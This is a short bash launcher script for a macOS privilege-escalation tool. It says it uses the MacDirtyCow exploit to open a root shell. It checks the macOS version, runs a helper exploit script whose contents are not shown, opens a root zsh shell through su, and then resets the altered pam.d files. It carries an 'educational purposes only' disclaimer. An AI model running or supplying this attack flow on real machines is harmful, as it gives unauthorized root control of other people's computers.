#!/bin/bash

# This script will use the MacDirtyCow exploit to open a root shell in Mac.
# 
# This script is for educational purposes only. I am not responsible for any
# damage caused by this script.

cd $(dirname $0)

# Check compatibility
compat=$(./helpers/compat.command)
if [ $compat -eq 0 ]; then
	echo "Sorry, your macOS version ($(sw_vers -productVersion)) is not compatible with this program."
	echo "Check the README.md to see supported versions."
	exit 1
fi

# Run exploit
./helpers/exploit.command

# Open root shell
su - root -c /bin/zsh

# Revert pam.d files to original
sudo ./helpers/reset_pam.command